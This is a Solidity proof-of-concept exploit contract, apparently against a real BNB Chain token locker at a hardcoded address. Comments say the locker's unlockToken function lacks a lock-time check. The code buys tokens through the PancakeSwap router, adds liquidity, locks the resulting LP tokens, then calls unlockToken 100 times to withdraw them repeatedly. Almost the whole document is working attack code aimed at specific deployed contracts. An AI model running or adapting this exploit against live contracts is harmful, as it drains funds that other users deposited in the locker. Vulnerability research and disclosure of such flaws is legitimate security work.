
pragma solidity ^0.8.9;

import "./IUniswapV2Router02.sol";
import "./IERC20.sol";

interface ILocker {
    function createLocker(address a, uint256 b, uint256 c, string memory d) external payable;
    function unlockToken(uint256 a) external;
}
//The function unlockToken in the decompiled source code was particularly interesting because
// it seemed to miss some important sanity checks. Namely, the contract allowed to unlock the tokens multiple times
// because it lacked a check that block.timestamp is larger than locktime.
// It seemed that after the lock period elapsed, the tokens could be unlocked only once,
// but before that they could be unlocked infinite number of times, because lock amount was set to zero only if block.
//timestamp was larger than locktime.

contract POC {

    address owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {

    }

    fallback() external payable {

    }

    function start() public payable {
        require(msg.sender == owner);
        address token = 0x2C80bC9bFa4EC680EfB949C51806bDDEE5Ac8299; // token from pool
        address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        address lp_token = 0xdfdc2291e2084A228BD07D69369770A37C76D7ff; // pair address
        address pancakeRoter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address lock = 0xEb3a9C56d963b971d320f889bE2fb8B59853e449; // vulnerable locker
        uint amountOut = 10000000 * 1e9;
        address[] memory path = new address[](2);
        path[0] = wbnb;
        path[1] = token;
        // Swap WBNB to get tokens
        IUniswapV2Router02(pancakeRoter).swapETHForExactTokens{value: 2e18}(amountOut, path, address(this), block.timestamp + 1000);

        uint token_balance = IERC20(token).balanceOf(address(this));

        IERC20(token).approve(pancakeRoter, token_balance);

        // Add liquidity to get LP tokens
        IUniswapV2Router02(pancakeRoter).addLiquidityETH{value: 2e18}(token, token_balance, token_balance, 0, address(this), block.timestamp + 1000);

        uint lp_balance = IERC20(lp_token).balanceOf(address(this));
 
        IERC20(lp_token).approve(lock, lp_balance);

        string memory test = "test";

        // create Locker of LP token
        ILocker(lock).createLocker{value: 3e17}(lp_token, block.timestamp + 10000, lp_balance, test);

        // Unlock token 100 times
        for (uint i = 0; i < 100; i++) {
            ILocker(lock).unlockToken(0);
        }

    }

}